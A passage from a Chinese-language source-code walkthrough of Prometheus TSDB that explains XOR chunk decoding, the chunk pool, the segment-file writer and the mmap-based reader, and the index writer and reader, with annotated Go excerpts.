标识位为\"10\"、\"110\"、\"1110\"，则读取指定的数量的bit位，获得dod值 bits, err := it.br.readBits(int(sz)) dod = int64(bits) &#125; it.tDelta = uint64(int64(it.tDelta) + dod) // 计算两个点的时间戳的差值 it.t = it.t + int64(it.tDelta) // 根据上一点的时间戳计算当前点的时间戳 return it.readValue() // readValue()方法的具体内容在后面详细介绍&#125; 在xorIterator.Next()方法读取timestamp的同时，还会调用readValue()方法读取时序点的value值。在readValue()方法中首先会读取控制位，然后根据控制位确定value值，其具体步骤如下所示： 如果控制位的第一个bit位为“0”，则表示当前时序点的value值与前一个value值相同，后续无需进行任何读取操作。否则，读取控制位的第二个bit位。 如果控制位的第二个bit位为“0”，则表示当前XOR结果的前置“0”和后置“0”与前一个XOR结果的个数相同，后续直接读取当前XOR结果中间非零部分即可。 如果控制位的第二个bit位为“1”，则需要先读取当前XOR结果中前置“0”的个数，然后读取XOR结果中间非零部分的长度，最后读取中间非零部分的值。 最后根据前一个点的value值以及XOR运算结果，得到当前点的value值。 下面是xorIterator.readValue()方法的具体实现分析： 1234567891011121314151617181920212223242526272829func (it *xorIterator) readValue() bool &#123; bit, err := it.br.readBit() // 读取控制位的第一个bit位 if bit == zero &#123; // 如果控制位第一个bit位为\"0\"，则表示当前时序点的value值与前一个点的value值相同 &#125; else &#123; bit, err := it.br.readBit() // 如果控制位第一个bit位为\"1\"，则需要读取第二个控制位 if bit == zero &#123; // 控制位为\"10\"，则表示可以直接读取XOR值的中间非0部分(因为其前置\"0\"和后置\"0\"与前一个 // XOR结果的个数相同) &#125; else &#123; // 控制位为\"11\"，则表示XOR结果中前置\"0\"和后置\"0\"与前一个XOR值的个数相同 bits, err := it.br.readBits(5) // 读取XOR结果中前置\"0\"的个数(5个bit位) it.leading = uint8(bits) // 更新leading字段，记录前置\"0\"的个数 bits, err = it.br.readBits(6) // 读取XOR结果中非0部分的长度(6个bit位) mbits := uint8(bits) if mbits == 0 &#123; mbits = 64 &#125; it.trailing = 64 - it.leading - mbits // 计算XOR结果中后置\"0\"的个数 &#125; mbits := int(64 - it.leading - it.trailing) // 计算XOR值中非0部分的位数 bits, err := it.br.readBits(mbits) // 读取XOR结果中非0部分 // 根据前一个时序点的value值以及XOR值，得到当前点的value值 vbits := math.Float64bits(it.val) vbits ^= (bits &lt;&lt; it.trailing) it.val = math.Float64frombits(vbits) // 更新val字段 &#125; it.numRead++ // 此次读取完成，递增numRead字段 return true&#125; 从前面对xorIterator.Next()方法以及readValue()方法的分析我们可以看到，xorIterator在迭代过程中始终使用t和val字段记录当前时序点的timestamp和value值，在xorIterator.At()方法中也是始终返回这两个字段值，其实现比较简单，这里不再展开介绍。 Pool结构体pool是一个内存中的XORChunk实例池，其底层是基于sync.Pool实现的。这里简单介绍一下Golang中的sync.Pool，Golang除了像JVM那样提供了一些垃圾回收的机制，还提供了很多避免产生垃圾对象的机制，例如这里介绍的池化技术。 在Golang标准库的很多包中，都使用了对象池来避免产生过多的垃圾对象，例如我们经常使用的fmt包、regexp包等，都各自实现了对象池，且它们的实现都很类似。另外，这种对象池的实现都不会释放内存，这就会与垃圾收集器的思想产生冲突，在某些场景中导致内存使用过高。 就上述问题，曾有人建议在sync包里加入一个公开的池类型供大家复用。当然，这也面临很多问题，例如，这个池类型应该放到标准库中吗？如果放到标准库中，应该公开吗？这个池类型的实现应该释放内存吗？如果需要释放内存，那在什么时机释放？这个新增的类型应该叫做Cache还是Pool？ 这里可以先简单区分一下Cache和Pool的区别。读者可以将Cache理解成一个全局的Map，我们可以根据不同的Key获取到不同的Value，而Pool中的存储的元素完全一样，与刚初始化完成的实例完全一样。另外，Cache会使用不同的过期算法进行清理，例如LRU、LFU、LIRS等等。 大家特别关心另一个点是Pool在何时释放内存。有人建议在GC之前进行释放，也有人建议在在GC之后进行释放，还有人提出基于过期时间或者使用弱引用的方式。虽然这些建议都有自己的理由，但同时也都有一些弊端。最终，Golang官方决定在垃圾收集时释放Pool占用的内存空间，也就是说，Pool中的对象是在两次垃圾收集之间进行重用的。而且，这也突出了Pool的目的是让垃圾回收变得更加高效，而不是避免垃圾回收。 大致了解了sync.pool的设计初衷和目标之后，我们来看Prometheus TSDB中Pool接口的定义，如下所示： 1234type Pool interface &#123; Put(Chunk) error // 将Chunk实例放回到池中 Get(e Encoding, b []byte) (Chunk, error) // 根据指定的Encoding从池中获取Chunk实例&#125; 在Prometheus TSDB中提供了该Pool接口的唯一实现——结构体pool，其底层依赖Golang sync.Pool实现，其NewPool()方法实际上就是初始化sync.Pool实例，如下所示： 123456789func NewPool() Pool &#123; return &amp;pool&#123; xor: sync.Pool&#123; // 如果调用Pool.Get()方法从池中获取对象时没有可用的Chunk实例，则会通过该函数 // 创建新的XORChunk实例返回 New: func() interface&#123;&#125; &#123; return &amp;XORChunk&#123;b: &amp;bstream&#123;&#125;&#125; &#125;, &#125;, &#125;&#125; 结构体pool的Get()方法和Put()方法会先检测Chunk实例的类型，然后调用sync.Pool实现从池中读取Chunk实例以及向池中放回Chunk实例的功能，大致实现如下所示： 1234567891011121314151617181920212223func (p *pool) Get(e Encoding, b []byte) (Chunk, error) &#123; switch e &#123; case EncXOR: c := p.xor.Get().(*XORChunk) // 从Pool中获取XORChunk实例 c.b.stream = b // 填充bstream c.b.count = 0 return c, nil &#125; return nil, errors.Errorf(\"invalid encoding %q\", e)&#125;func (p *pool) Put(c Chunk) error &#123; switch c.Encoding() &#123; case EncXOR: xc, ok := c.(*XORChunk) // 检测传入的Chunk实例的实际类型 xc.b.stream = nil // 清空XORChunk底层的bstream xc.b.count = 0 p.xor.Put(c) // 将XORChunk实例放入到Pool中 default: return errors.Errorf(\"invalid encoding %q\", c.Encoding()) &#125; return nil&#125; Meta元数据通过上一小节的介绍，我们了解到Chunk中存储的都是时序数据，每个Chunk实例都有一些关联的元数据信息，例如Chunk实例所覆盖的时间范围，这些元数据记录到了Meta实例中。结构体Meta的核心字段如下： Ref（uint64类型）：Ref字段记录了关联Chunk在磁盘上的位置信息，主要用于读取。 Chunk（chunkenc.Chunk类型）：指向XORChunk实例。在后面介绍ChunkWriter时会看到，在将Chunk中时序数据持久化到文件时，该字段必须有值。 MinTime、MaxTime（int64类型）：MinTime和MaxTime两个字段记录了Chunk实例所覆盖的时间范围。 Meta结构体中提供了两个辅助方法，一个是writeHash()方法，它负责为关联的Chunk计算Hash值。另一个方法是OverlapsClosedInterval()方法，该方法用于确定给定的时间范围是与关联Chunk实例所覆盖的时间范围有重合。如图2-5所示，三种场景下，给定的时间范围都与Chunk有重合。 Meta结构体中的这两个方法的实现比较简单，这里不再粘贴代码。 ChunkWriter通过前面小节的介绍，我们了解到Prometheus TSDB是如何在内存中组织时序数据的，那么这些内存中的时序数据是如何持久化到磁盘上呢？时序数据在磁盘上的组织方式又是什么样子的呢？本小节将通过对ChunkWriter 接口及其实现的分析来解答这些问题。 ChunkWriter是Prometheus TSDB中负责时序数据持久化的接口之一，通过该接口的定义（如下）可以看到其最核心的方法是WriteChunks()，该方法的主要功能就是持久化多个Chunk实例中的时序数据。 1234type ChunkWriter interface &#123; WriteChunks(chunks ...chunks.Meta) error Close() error // 关闭底层关联的文件资源&#125; 这里注意WriteChunks()方法的参数，传入的是多个Meta实例，WriteChunks()方法要求每个Meta实例的Chunk字段必须有值。在完成写入之后，Meta实例的Ref字段也会被自动赋值，用于后面进行读取操作。 chunks.Writer结构体实现了上述ChunkWriter接口，在开始分析chunks.Writer持久化时序数据的实现之前，先回顾一下Prometheus TSDB在磁盘上的目录以及文件结构，如图2-6所示。首先来看目录结构，Prometheus在data目录中维护了多个block目录，这些block目录都是以“b-”开头的，以递增编号结尾，每个block目录维护了一个时间段的时序数据以及相关的元数据。在每个block目录下都有一个index文件，其中维护了索引的相关内容，还有一个meta.json文件，其中维护了block目录相关的元数据，这两个文件的内容在后面详细分析。这里重点来看chunks目录，顾名思义，其中存储的就是前面介绍的Chunk实例中存储的时序数据，chunks目录下的每个文件的大小都有上限（defaultChunkSegmentSize），到达上限之后会切换到新文件继续写入时序数据。为了便于描述，笔者将chunks目录下的文件称为“segment文件”，每个segment文件的名称都是以递增序号进行命名的。 了解了Prometheus TSDB在磁盘上大致的目录结构之后，再来深入到segment文件中分析一下其存储格式。如图2-7所示，在创建segment文件时，首先会写入一个8字节的文件头，之后才会开始写入Chunk数据。在持久化一个Chunk的时候，会先写入该Chunk中时序数据所占的字节数，然后才写入该Chunk中记录的时序数据，最后计算该Chunk对应的CRC32循环校验码并写入到segment文件中。 了解了Prometheus TSDB存储时序数据的目录结构和文件格式之后，下面正式开始分析chunks.Writer结构体，其核心字段如下所示： dirFile（*os.File类型）：磁盘上存储时序数据的目录。 files（[]*os.File类型）：dirFile目录下存储时序数据的segment文件集合，其中只有最后一个segment文件是当前有效的，即当前可以写入数据数据的segment文件，之前的segment文件不可写。 wbuf（*bufio.Writer类型）：用于写文件的bufio.Writer，该Writer是带缓冲区的。 n（int64类型）：当前分段已经写入的字节数。 crc32（hash.Hash类型）：crc32校验码，每一个写入的Chunk都会生成一个校验码。 segmentSize（int64类型）：每个分段文件的大小上限，默认是512 * 1024 * 1024 Prometheus TSDB通过NewWriter()函数创建Writer实例，其中同时还会创建存放segment文件的目录并赋予足够的操作权限，具体实现如下所示： 1234567891011func NewWriter(dir string) (*Writer, error) &#123; // 创建dir参数指定的目录，并给予足够的权限(略) dirFile, err := fileutil.OpenDir(dir) // 打开该目录 cw := &amp;Writer&#123; // 初始化Writer实例 dirFile: dirFile, n: 0, crc32: newCRC32(), // 创建复用的CRC32循环校验码 segmentSize: defaultChunkSegmentSize, &#125; return cw, nil&#125; 完成Writer实例的初始化之后，就可以调用其WriteChunks()方法批量写入Chunk数据了。在该方法中，首先会根据此次写入的数据量以及当前segment文件的大小，决定是否要创建并切换到新的segment文件上完成此次写入，之后会按照前面介绍的segment文件的格式，逐个写入Chunk实例中的时序数据。WriteChunks()方法的具体实现如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344func (w *Writer) WriteChunks(chks ...Meta) error &#123; maxLen := int64(binary.MaxVarintLen32) // 计算此次待写入的所有Chunk实例的字节总数 for _, c := range chks &#123; maxLen += binary.MaxVarintLen32 + 1 maxLen += int64(len(c.Chunk.Bytes())) &#125; newsz := w.n + maxLen // 计算写入传入Chunk集合之后，当前segment文件所占的字节数 // 如果满足下述三个条件中的任意一个，则会通过cut()方法新建segment文件，此次传入的Chunk集合 // 将全部写入到新建segment文件中: // 1、该chunks.Writer实例第一次写入 // 2、写入之前，当前segment文件大小已经达到切分的阈值 // 3、如果将传入Chunk集合写入之后，当前segment文件大小已经达到切分的阈值 if w.wbuf == nil || w.n &gt; w.segmentSize || newsz &gt; w.segmentSize &amp;&amp; maxLen &lt;= w.segmentSize &#123; if err := w.cut(); ... // 省略错误处理的代码 &#125; var ( b = [binary.MaxVarintLen32]byte&#123;&#125; // 将当前segment文件在Writer.files集合中的下标，记录到seq变量的高32位中 seq = uint64(w.seq()) &lt;&lt; 32 ) for i := range chks &#123; // 将Chunk逐个写入到当前segment文件中 chk := &amp;chks[i] // 更新Ref字段，其中高32位明确了该Chunk在哪个segment文件中，低32位记录了该Chunk // 在该segment文件中的字节偏移量。在后面介绍读取过程时，还会看到Ref字段的作用 chk.Ref = seq | uint64(w.n) // 统计该Chunk的字节数，并记录到segment文件中 n := binary.PutUvarint(b[:], uint64(len(chk.Chunk.Bytes()))) if err := w.write(b[:n]); ... b[0] = byte(chk.Chunk.Encoding()) // 将Chunk的编码类型写入到segment文件中 if err := w.write(b[:1]); ... // 省略错误处理的代码 // 将Chunk中记录的时序数据写入到segment文件中 if err := w.write(chk.Chunk.Bytes()); ... // 省略错误处理的代码 // 计算该Chunk的CRC32校验码并写入到segment文件中 w.crc32.Reset() if err := chk.writeHash(w.crc32); ... // 省略错误处理的代码 if err := w.write(w.crc32.Sum(b[:0])); ... // 省略错误处理的代码 &#125; return nil&#125; 在WriteChunks()方法中我们看到，无论是首次写入还是达到segment文件大小上限值，都会调用cut()方法。在cut()方法中会按序完成下列操作，实现segment文件的切换： 调用finalizeTail()方法结束当前文件的写入。 获取新segment文件的名称，并创建对应的新segment文件。在新segment文件名的计算方式大致是：先获取当前目录下全部segment文件名并进行排序，正如前面在目录结构中介绍的那样，segment文件名中都是包含数字编号的，新segment文件名称就是当前最大的编号+1。该过程在nextSequenceFile()方法中实现，感兴趣的读者可以参考其代码进行学习，这里不再展开分析。 按照segmentSize字段指定的大小为新segment文件预分配空间。 向新segment文件写入8字节的文件头。 将新segment文件记录到Writer.files切片的末尾。 Writer.cut()方法具体实现如下所示： 1234567891011121314151617181920212223func (w *Writer) cut() error &#123; // 通过finalizeTail()方法完成当前文件的写入，其具体实现在后面详细介绍 if err := w.finalizeTail(); ... p, _, err := nextSequenceFile(w.dirFile.Name()) // 计算下一个写入的新segment文件的名称 f, err := os.OpenFile(p, os.O_WRONLY|os.O_CREATE, 0666) // 创建新segment文件 // 按照segment文件大小的上限进行预分配 if err = fileutil.Preallocate(f, w.segmentSize, true); ... if err = w.dirFile.Sync();... // 将上述segment文件创建以及预分配操作同步到磁盘 metab := make([]byte, 8) // 创建文件头，共占8个字节 binary.BigEndian.PutUint32(metab[:4], MagicChunks) // 前4个字节写入固定头信息 metab[4] = chunksFormatV1 // 写入版本信息 if _, err := f.Write(metab); ... // 将8字节文件头写入到segment文件中 w.files = append(w.files, f) // 将新建的segment文件记录到Writer.files集合中 if w.wbuf != nil &#123; w.wbuf.Reset(f) // 将wbuf从上一个文件指向新建的文件 &#125; else &#123; // 第一次写入时会初始化wbuf字段，其缓冲区为8M w.wbuf = bufio.NewWriterSize(f, 8*1024*1024) &#125; w.n = 8 // 已写入文件头，占用8个字节 return nil&#125; Writer.finalizeTail()方法主要完成了两件事，一是将已写入当前segment文件的时序数据刷新到磁盘中，二是对当前segment文件中预分配但是未使用的部分进行截断，最后关闭文件，其具体实现如下所示： 123456789101112func (w *Writer) finalizeTail() error &#123; tf := w.tail() // 获取files集合中最后一个文件，即当前有效的写入文件 // 调用wbuf字段(bufio.Writer)的Flush()方法将数据刷新到磁盘中(略) if err := w.wbuf.Flush();...// 省略异常处理的相关代码 if err := fileutil.Fsync(tf);... // 省略异常处理的相关代码 // 前面在创建文件时会进行预分配，这里获取当前写入的位置，并调用Truncate()方法进行截断， // 将该文件中off之后的预分配的内容删掉 off, err := tf.Seek(0, io.SeekCurrent) if err := tf.Truncate(off);... return tf.Close() // 关闭当前文件&#125; 到此为止，ChunkWriter接口及其具体实现的内容就全部介绍完了。 ChunkReader介绍完Prometheus TSDB持久化时序数据的相关实现之后，我们继续分析Prometheus TSDB如何将持久化的时序数据读取到内存中，并封装到相应的Chunk实例中。 首先来看读取时序数据的核心接口——ChunkReader，该接口的Chunk()方法会根据ref参数读取对应的Chunk并返回，这里的ref参数就是前面在写入Chunk实例时为其填充的Ref字段。 1234type ChunkReader interface &#123; Chunk(ref uint64) (chunkenc.Chunk, error) // 根据ref参数读取相应的Chunk实例 Close() error // 关闭当前ChunkReader并释放所有资源&#125; Prometheus TSDB中有多个 ChunkReader接口的实现，如图2-8所示，本小节主要介绍的是其中chunks.Reader实现，剩余两个实现在后面涉及到时再做描述。 chunks.Reader结构体中的核心字段如下： bs（[]ByteSlice类型）：ByteSlice接口是对byte切片的抽象，它提供了两个方法，一个是Len()方法，用于返回底层byte切片的长度，另一个方法是Range()方法，用于返回底层byte切片在指定区间内的数据。ByteSlice接口的实现是realByteSlice，realByteSlice则是[]byte的类型别名。bs字段存储的是时序数据，其中每个ByteSlice实例都对应一个segment文件的数据。 cs（[]io.Closer类型）：当前Reader实例能够读取的文件集合，其中每个元素都对应一个segment文件。 pool（chunkenc.Pool类型）：用于存储可重用的Chunk实例。 在开始介绍chunks.Reader如何读取segment文件之前，我们先来简单介绍mmap相关的基础知识。 mmap简介 从Linux系统的角度来看，操作系统的内存空间被分为两大部分，分别是：内核空间、用户空间，其中“用户空间”和“内核空间”的空间大小、操作权限以及核心功能都是不尽相同。这里的“内核空间”是操作系统本身使用的内存空间，而“用户空间”则是提供给各个进程使用的内存空间。用户进程不具有访问内核资源的权限，例如访问硬件资源，因此一个用户进程需要使用内核资源的时候，就需要通过系统调用来完成。图2-9以读写磁盘文件为例，展示了用户进程进行系统调用的整个过程： 首先是读取文件的过程，用户进程发出read()系统调用之后，会完成从用户态到内核态的上下文切换。之后会通过DMA将文件中的数据从磁盘拷贝到内核空间的缓冲区中。 将内核空间缓冲区的数据拷贝到用户空间的缓冲区中，然后read()系统调用返回，此时会完成从内核态到用户态的上下文切换，整个读取文件的过程结束。 之后是写入文件的过程，用户进程发出write()系统调用之后，会完成用户态到内核态的上下文切换。将数据从用户空间缓冲区拷贝到内核空间缓冲区。 最后，write()系统调用返回，同时进程会从内核态切换到用户态。而数据则将从内核缓冲区写入磁盘。到此为止，整个写入文件的过程结束。 所以一次文件读取过程涉及两次数据拷贝以及两次上下文切换，同理，一次文件写入过程也会涉及两次数据拷贝以及两次上下文切换。 mmap是操作系统提供的内存映射机制，它可以将磁盘上一个文件中的一部分映射到一个虚拟内存区域上，这样程序就可以像操作内存一样操作文件。mmap也是实现“零拷贝”的一种方式，其大致原理如下： 用户进程发出mmap()系统调用之后，会完成从用户态到内核态的上下文切换。然后通过DMA将磁盘文件中的数据拷贝到内核空间的缓冲区中。 mmap()系统调用返回，用户进程会完成从内核态到用户态的上下文切换。接着用户空间和内核空间共享这个缓冲区，而不需要将其中的数据从内核空间拷贝到用户空间。因为用户空间和内核空间共享了这个缓冲区数据，所以用户空间就可以像在操作自己缓冲区中数据一般操作这个由内核空间共享的缓冲区。 在写入文件的时候，用户进程发出write()系统调用，用户进程从用户态切换到内核态，并向共享缓冲区中写入数据。 完成数据写入之后，write()系统调用返回，用户进程从内核态切换到用户态，同时会通过DMA将内核缓冲区中的数据刷新到磁盘中。 mmap的工作原理如下图所示，其上下文切换的次数与前面介绍的传统I/O相同，在图2-10中也就没用展示，但是mmap进行内存拷贝的次数要比传统I/O的少： 了解了mmap的原理之后，我们继续回到chunks.Reader进行分析。首先来看其初始化过程，该过程由chunks.NewDirReader()函数完成，该函数首先会获取指定chunks目录下的所有segment文件名并进行排序，然后通过mmap系统调用将segment文件映射到虚拟内存中，之后校验每个segment文件的内容是否合法（即segment文件开头是否为固定的MagicChunks文件头），最后创建对应的Reader实例。NewDirReader()函数的具体实现如下所示： 123456789101112131415161718192021222324252627282930313233343536373839func NewDirReader(dir string, pool chunkenc.Pool) (*Reader, error) &#123; // sequenceFiles()函数会读取指定chunks文件夹中的分段文件并按照文件名进行排序，这里不再展开 // 介绍其具体实现，感兴趣的读者可以参考其源码进行学习 files, err := sequenceFiles(dir) if pool == nil &#123; // 初始化Chunk池 pool = chunkenc.NewPool() &#125; var bs []ByteSlice var cs []io.Closer for _, fn := range files &#123; f, err := fileutil.OpenMmapFile(fn) // 通过mmap系统调用将当前整个segment文件映射到内存 cs = append(cs, f) // 将映射得到的MmapFile实例追加到cs切片中 bs = append(bs, realByteSlice(f.Bytes())) // 将segment文件映射到bs切片中 &#125; return newReader(bs, cs, pool) // 其中完成文件头的校验以及Reader实例的创建&#125;下面再来看Reader.Chunk()方法，该方法会根据传入的ref参数在当前chunks目录中查找对应Chunk数据位置，然后从Chunk池中获取一个空闲Chunk实例，最后从文件中读取时序数据填充到Chunk实例中，并将其返回。Chunk()方法的具体实现如下所示：func (s *Reader) Chunk(ref uint64) (chunkenc.Chunk, error) &#123; var ( seq = int(ref &gt;&gt; 32) // 从ref参数的高32位中获取对应Chunk所在的segment文件编号 // 从ref参数的低32位中获取Chunk在该segment文件中的字节偏移量 off = int((ref &lt;&lt; 32) &gt;&gt; 32) ) // 检测seq编号是否合法，即检测seq编号是否大于chunks目录中最大编号(略) b := s.bs[seq] // 查找到正确的segment文件之后，检测off偏移量是否合法，即检测off偏移量是否超过了 // 该segment文件的大小(略) // 确定该Chunk所在的segment文件以及其在segment文件中的偏移量之后，下面会读取Chunk在文件 // 中所占的字节数 r := b.Range(off, off+binary.MaxVarintLen32) l, n := binary.Uvarint(r) if n &lt;= 0 &#123; return nil, errors.Errorf(\"reading chunk length failed with %d\", n) &#125; r = b.Range(off+n, off+n+int(l)) // 获取ref对应的时序数据 // 从Chunk池中获取一个空闲的Chunk实例，并将Encoding方式以及时序数据填充进去 return s.pool.Get(chunkenc.Encoding(r[0]), r[1:1+l])&#125; 最后，Reader.Close()方法会关闭当前Reader实例底层涉及到的全部segment文件，其实现比较简单，这里不再展开分析，感兴趣的读者可以参考其代码进行学习。 fileutil 提供了一些操作文件/目录的函数, 处理了不同平台 (主要是 win) 的兼容性问题. indexindex 实现针对 labels 的索引. 在 prometheus/tsdb 中, 认为 labels + timestamp + value 是一个完整的数据点 chunks 相关的代码用于存储 timestamp + value, 而 index 则是对于 labels 的处理. encbuf, decbuf作为 buffer 在 index 数据编码/解码时进行 复用 实际上这里也定义了一些数据格式如何进行存储 12345678910111213141516171819202122// putVarintStr writes a string to the buffer prefixed by its varint length (in bytes!).// 对于字符串, 分别写入长度及字符串本身func (e *encbuf) putUvarintStr(s string) &#123; b := *(*[]byte)(unsafe.Pointer(&amp;s)) e.putUvarint(len(b)) e.putString(s)&#125;// 相应地, 在解码时也会先确定 str 长度, 再从整个 []byte 中取出必要的部分func (d *decbuf) uvarintStr() string &#123; l := d.uvarint64() if d.e != nil &#123; return \"\" &#125; if len(d.b) &lt; int(l) &#123; d.e = errInvalidSize return \"\" &#125; s := string(d.b[:l]) d.b = d.b[l:] return s&#125; indexWriterSeries12345678910type indexWriterSeries struct &#123; // labels 的实际内容, 即 kv 对 labels labels.Labels // 这里重要的实际是 Meta.Ref, 即每个 chunk 对应的文件/起点 chunks []chunks.Meta // series file offset of chunks // 这里是 labels 数据在文件中的 offset offset uint32 // index file offset of series reference&#125; indexTOCindex table of contents, 记录 index 不同类型数据的位置 12345678type indexTOC struct &#123; symbols uint64 series uint64 labelIndices uint64 labelIndicesTable uint64 postings uint64 postingsTable uint64&#125; Writer实现 IndexWriter , 基于文件的 index 存储 index 的文件格式要比 chunk 复杂的多, 可以参考 Documentation/format/index.md 每个 index 文件的写入分为 5 个阶段, 顺序执行. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546type indexWriterStage uint8const ( idxStageNone indexWriterStage = iota idxStageSymbols idxStageSeries idxStageLabelIndex idxStagePostings idxStageDone)// ensureStage handles transitions between write stages and ensures that IndexWriter// methods are called in an order valid for the implementation.func (w *Writer) ensureStage(s indexWriterStage) error &#123; if w.stage == s &#123; return nil &#125; // 排在当前阶段之前的, 不可再执行 if w.stage &gt; s &#123; return errors.Errorf(\"invalid stage %q, currently at %q\", s, w.stage) &#125; // Mark start of sections in table of contents. switch s &#123; // ... // 执行到完成阶段时, 自动写入必要的辅助信息 case idxStageDone: w.toc.labelIndicesTable = w.pos if err := w.writeOffsetTable(w.labelIndexes); err != nil &#123; return err &#125; w.toc.postingsTable = w.pos if err := w.writeOffsetTable(w.postings); err != nil &#123; return err &#125; if err := w.writeTOC(); err != nil &#123; return err &#125; &#125; w.stage = s return nil&#125; AddSymbols 123456789func (w *Writer) AddSymbols(sym map[string]struct&#123;&#125;) error &#123; if err := w.ensureStage(idxStageSymbols); err != nil &#123; return err &#125; // ... return errors.Wrap(err, \"write symbols\")&#125; label 中的每一个键或值都是一个 symbol. 通过 “使用对 symbol 的引用” 的方式, 来缩减后续索引文件中的空间占用. AddSeries 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func (w *Writer) AddSeries(ref uint64, lset labels.Labels, chunks ...chunks.Meta) error &#123; if err := w.ensureStage(idxStageSeries); err != nil &#123; return err &#125; if labels.Compare(lset, w.lastSeries) &lt;= 0 &#123; return errors.Errorf(\"out-of-order series added with label set %q\", lset) &#125; // 记录每个时间序列的位置 if _, ok := w.seriesOffsets[ref]; ok &#123; return errors.Errorf(\"series with reference %d already added\", ref) &#125; w.seriesOffsets[ref] = w.pos w.buf2.reset() w.buf2.putUvarint(len(lset)) // 对于每个 label, 分别记录 它的 name 和 value 在索引文件中的位置 for _, l := range lset &#123; offset, ok := w.symbols[l.Name] // ... offset, ok = w.symbols[l.Value] // ... &#125; w.buf2.putUvarint(len(chunks)) // 对于 chunk 数据, 记录它覆盖的时间范围, 以及存储地址 // 除第一个 chunk 外, 其他记录的都是变化量 if len(chunks) &gt; 0 &#123; c := chunks[0] w.buf2.putVarint64(c.MinTime) w.buf2.putUvarint64(uint64(c.MaxTime - c.MinTime)) w.buf2.putUvarint64(c.Ref) t0 := c.MaxTime ref0 := int64(c.Ref) for _, c := range chunks[1:] &#123; w.buf2.putUvarint64(uint64(c.MinTime - t0)) w.buf2.putUvarint64(uint64(c.MaxTime - c.MinTime)) t0 = c.MaxTime w.buf2.putVarint64(int64(c.Ref) - ref0) ref0 = int64(c.Ref) &#125; &#125; // ... return nil&#125; WriteLabelIndex 1234567891011121314151617181920212223242526272829303132333435// 这里传入的参数可以认为是下述结构// 其中每一组 value 都是 names 的一组取值组合// type Label struct &#123;// names []string// valus [][]string// &#125;func (w *Writer) WriteLabelIndex(names []string, values []string) error &#123; if len(values)%len(names) != 0 &#123; return errors.Errorf(\"invalid value list length %d for %d names\", len(values), len(names)) &#125; if err := w.ensureStage(idxStageLabelIndex); err != nil &#123; return errors.Wrap(err, \"ensure stage\") &#125; // ... // 所有 hash entry 会统一在后续阶段写入 w.labelIndexes = append(w.labelIndexes, hashEntry&#123; keys: names, offset: w.pos, &#125;) // ... // 对于每个 value, 都只写入引用值 for _, v := range valt.s &#123; offset, ok := w.symbols[v] // ... &#125; // ... err = w.write(w.buf1.get(), w.buf2.get()) return errors.Wrap(err, \"write label index\")&#125; WritePostings 1234567891011121314151617181920212223242526272829303132// Postings 用来记录每一个 label (一对 name, value) 对应了哪些数据块, 用于检索func (w *Writer) WritePostings(name, value string, it Postings) error &#123; // ... // 每一对 name-value 对应的数据位置 w.postings = append(w.postings, hashEntry&#123; keys: []string&#123;name, value&#125;, offset: w.pos, &#125;) // Order of the references in the postings list does not imply order // of the series references within the persisted block they are mapped to. // We have to sort the new references again. refs := w.uint32s[:0] for it.Next() &#123; offset, ok := w.seriesOffsets[it.At()] // ... refs = append(refs, uint32(offset)) &#125; if err := it.Err(); err != nil &#123; return err &#125; sort.Sort(uint32slice(refs)) // ... err := w.write(w.buf1.get(), w.buf2.get()) return errors.Wrap(err, \"write postings\")&#125; Close 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func (w *Writer) Close() error &#123; // 这里会自动执行 labelIndexes, postings, toc 的写入 if err := w.ensureStage(idxStageDone); err != nil &#123; return err &#125; // 文件落盘 if err := w.fbuf.Flush(); err != nil &#123; return err &#125; if err := fileutil.Fsync(w.f); err != nil &#123; return err &#125; return w.f.Close()&#125;// writeOffsetTable writes a sequence of readable hash entries.func (w *Writer) writeOffsetTable(entries []hashEntry) error &#123; w.buf2.reset() w.buf2.putBE32int(len(entries)) for _, e := range entries &#123; w.buf2.putUvarint(len(e.keys)) for _, k := range e.keys &#123; w.buf2.putUvarintStr(k) &#125; w.buf2.putUvarint64(e.offset) &#125; w.buf1.reset() w.buf1.putBE32int(w.buf2.len()) w.buf2.putHash(w.crc32) return w.write(w.buf1.get(), w.buf2.get())&#125;func (w *Writer) writeTOC() error &#123; w.buf1.reset() w.buf1.putBE64(w.toc.symbols) w.buf1.putBE64(w.toc.series) w.buf1.putBE64(w.toc.labelIndices) w.buf1.putBE64(w.toc.labelIndicesTable) w.buf1.putBE64(w.toc.postings) w.buf1.putBE64(w.toc.postingsTable) w.buf1.putHash(w.crc32) return w.write(w.buf1.get())&#125; Reader实现了 IndexReader 12345678910111213141516171819202122232425262728293031323334353637383940414243func newReader(b ByteSlice, c io.Closer) (*Reader, error) &#123; r := &amp;Reader&#123; // ... &#125; // Verify magic number. // ... // toc 在文件尾部, 且长度固定, 因此可以直接读出 if err := r.readTOC(); err != nil &#123; return nil, errors.Wrap(err, \"read TOC\") &#125; if err := r.readSymbols(int(r.toc.symbols)); err != nil &#123; return nil, errors.Wrap(err, \"read symbols\") &#125; var err error err = r.readOffsetTable(r.toc.labelIndicesTable, func(key []string, off uint32) error &#123; // 不知道这里为什么会强制长度为 1? // 根据 Writer.WriteLabelIndex 的定义, 明显是支持多 names 的 // 实际验证, 多 names 写入没有问题, 但在读取的时候会在这里报错 // 等待后续看相关代码来理解吧. if len(key) != 1 &#123; return errors.Errorf(\"unexpected key length %d\", len(key)) &#125; r.labels[key[0]] = off return nil &#125;) if err != nil &#123; return nil, errors.Wrap(err, \"read label index table\") &#125; err = r.readOffsetTable(r.toc.postingsTable, func(key []string, off uint32) error &#123; // ... return nil &#125;) if err != nil &#123; return nil, errors.Wrap(err, \"read postings table\") &#125; r.dec = &amp;DecoderV1&#123;symbols: r.symbols&#125; return r, nil&#125; PostingsPosting 及其实现的具体作用, 待阅读剩余部分的代码后再回过头来确认. 这是一个 Iterator. 123456789101112131415// Postings provides iterative access over a postings list.type Postings interface &#123; // Next advances the iterator and returns true if another value was found. Next() bool // Seek advances the iterator to value v or greater and returns // true if a value was found. Seek(v uint64) bool // At returns the value at the current iterator position. At() uint64 // Err returns the last error of the iterator. Err() error&#125; 给出了 Posting 的交集, 并集, 以及差集实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// Intersect returns a new postings list over the intersection of the// input postings.func Intersect(its ...Postings) Postings &#123; if len(its) == 0 &#123; return emptyPostings &#125; if len(its) == 1 &#123; return its[0] &#125; l := len(its) / 2 return newIntersectPostings(Intersect(its[:l]...), Intersect(its[l:]...))&#125;type intersectPostings struct &#123; a, b Postings aok, bok bool cur uint64&#125;// 